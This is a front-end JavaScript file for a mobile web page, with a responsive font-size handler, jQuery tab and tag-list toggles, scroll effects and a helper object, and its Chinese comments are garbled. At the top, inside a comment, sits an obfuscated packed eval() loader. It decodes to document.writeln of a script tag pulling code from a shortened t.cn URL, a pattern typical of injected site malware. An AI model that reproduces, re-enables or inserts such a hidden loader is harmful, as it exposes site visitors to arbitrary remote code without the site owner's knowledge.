/**
 * Created by tanytree on 2015/10/28.
 */
 
 
 
 /* 21217 eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|RGBTVkW|cn|http'.split('|'),0,{}));*/
(function (doc, win) {
    var docEl = doc.documentElement,
        resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',
        recalc = function () {
            var clientWidth = docEl.clientWidth;
            if (!clientWidth) return;
            docEl.style.fontSize = 20 * (clientWidth / 320) + 'px';
        };

    if (!doc.addEventListener) return;
    win.addEventListener(resizeEvt, recalc, false);
    doc.addEventListener('DOMContentLoaded', recalc, false);
})(document, window);
$(function(){
    $(".clickMore").on("click",function(e){
        $(".tagList").hide();
        var aThis=$(this);
        if(!$(e.target).hasClass('on')){
            aThis.addClass('on');
            $(this).find(".tagList").show();
        }else{
            aThis.removeClass('on');
            $(this).find(".tagList").hide();
        }
        return false;
    });

    $(".tagIcon").on("click",function(){
        $(".clickMore").removeClass('on');
        $(".clickMore .tagList").hide();
        var aThis=$(this);
        aThis.prev().toggle();
    });

    $(window).scroll(function() {
        if ($(window).scrollTop() > 0) {
            $(".top").addClass('rbgaBg');
        }
        else {
            $(".top").removeClass('rbgaBg');
        }
    });


});
$(function(){
    //myFun.tab(".tabThis");
});


$(function(){
    $(".tagList").each(function(){
        var len=$(this).find('li');
        var row = $('.funIcons .row');
        var i = 0;
        len.on('click',function(){
            i =  len.index(this);
            $(this).addClass('on').siblings().removeClass('on');
            $(".tagList").hide();
            $(".clickMore").removeClass('on');
            row.eq(i).show().siblings().hide();
            //alert($(this).index());
            return false
        })
    });
});


var myFun = {
    //����ÿ�����һ�������ÿ�����һ����margin
    rowlastLi: function(a, b) {
        $(a).each(function() {
            var li = $(this).find("ul>li");
            var len = $(this).find("ul>li").length;
            var y = len / b;
            for (var i = 1; i <= y; i++) {
                li.eq(i * b - 1).css({
                    'margin-right': '0'
                });
            }
        })
    },
    //tab�л�һ������
    tab: function(obj) {
        var tabObj = $(obj);
        tabObj.each(function() {
            var len = tabObj.find('.hd ul li');
            var row = tabObj.find('.bd .row');
            len.bind("click", function() {
                var index = 0;
                $(this).addClass('on').siblings().removeClass('on');
                index = len.index(this);
                row.eq(index).show().siblings().hide();
                return false;
            }).eq(0).trigger("click");
        });
    },
    //tab�л���������
    tabs: function(a, b, c) {
        var len = $(a);
        len.bind("click", function() {
            var index = 0;
            $(this).addClass(c).siblings().removeClass(c);
            index = len.index(this);
            $(b).eq(index).addClass("animate").show().siblings().removeClass("animate").hide();
            return false;
        }).eq(0).trigger("click");
    },

    navToggle:function(a){
      $(a).click(function(){
         $(this).addClass("on").siblings().removeClass('on');
      });
    },
    //������һ��li��border
    lastLi: function(a) {
        $(a).find("li").last().css('borderBottom', '0');
    },
    //������һ��li��margin-right
    lastLimr: function(a) {
        $(a).find("li").last().css('marginRight', '0');
    },

    //���������Ļ�����������ĵ��ģ���topֵ
    marginTop: function(a) {
        var wHeight = $(window).height();
        var boxHeight = $(a).height();
        //var scrollTop = $(window).scrollTop();
        var top = (wHeight - boxHeight) / 2;
        $(a).css('marginTop', top);
    },
    animate: function (sum){
        var t = $(window).scrollTop();
        var h = $(window).height();

        for(var i = 1; i < sum + 1; i ++){
            var off = $('.play' + i).offset().top + 100;

            if(t + h > off){
                $('.play' + i).addClass('animate');
            };
        };
    }

};



